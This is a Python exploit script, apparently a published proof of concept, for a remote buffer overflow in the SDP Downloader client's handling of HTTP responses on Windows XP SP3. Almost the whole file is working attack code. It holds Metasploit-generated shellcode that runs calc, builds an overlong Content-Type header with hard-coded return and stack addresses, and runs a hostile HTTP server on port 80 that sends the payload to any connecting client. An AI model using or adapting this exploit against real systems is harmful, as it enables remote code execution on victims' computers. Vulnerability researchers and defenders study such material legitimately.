#!/usr/bin/python
#Bug : SDP Downloader (http_response) Remote Buffer Overflow Exploit
# by: sup3r
#Tested on : Xp sp3
#http://sdp.ppona.com/

from socket import *

# win32_exec -  EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x33\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x71"
"\xf3\x2a\x67\x83\xeb\xfc\xe2\xf4\x8d\x1b\x6e\x67\x71\xf3\xa1\x22"
"\x4d\x78\x56\x62\x09\xf2\xc5\xec\x3e\xeb\xa1\x38\x51\xf2\xc1\x2e"
"\xfa\xc7\xa1\x66\x9f\xc2\xea\xfe\xdd\x77\xea\x13\x76\x32\xe0\x6a"
"\x70\x31\xc1\x93\x4a\xa7\x0e\x63\x04\x16\xa1\x38\x55\xf2\xc1\x01"
"\xfa\xff\x61\xec\x2e\xef\x2b\x8c\xfa\xef\xa1\x66\x9a\x7a\x76\x43"
"\x75\x30\x1b\xa7\x15\x78\x6a\x57\xf4\x33\x52\x6b\xfa\xb3\x26\xec"
"\x01\xef\x87\xec\x19\xfb\xc1\x6e\xfa\x73\x9a\x67\x71\xf3\xa1\x0f"
"\x4d\xac\x1b\x91\x11\xa5\xa3\x9f\xf2\x33\x51\x37\x19\x8d\xf2\x85"
"\x02\x9b\xb2\x99\xfb\xfd\x7d\x98\x96\x90\x4b\x0b\x12\xf3\x2a\x67")

buffer =  '\x41'*4
buffer += shellcode
buffer += '\x41'*(65584-len(shellcode))
buffer += '\xF0\xF1\xAB\x00'	
#00ABF1F0(shellcode address)
buffer += '\x41'*36
buffer += '\xBC\xEB\x12\x00'	
#0012EBBC Stack section (writable)
buffer += '\x43'*9000

header=(
"HTTP/1.1 200 OK\r\n"
"Content-Type: video/"+buffer+"\r\n"
"Last-Modified: 20 Mar 2010 09:50:10 GMT\r\n"
"Accept-Ranges: bytes\r\n"
"ETag: \"075a1fc3d4dc41:0\"\r\n"
"Server: Microsoft-IIS/7.5\r\n"
"X-Powered-By: ASP.NET\r\n"
"Date: Sat, 20 Mar 2010 14:31:46 GMT\r\n"
"Connection: close\r\n"
"Content-Length: 324\r\n\r\n")

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 80))
s.listen(1)
print "[+] Listening on [HTTP] 80"
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(header)
c.send(header)
raw_input("[+] Done, press enter to quit")
c.close()
s.close()

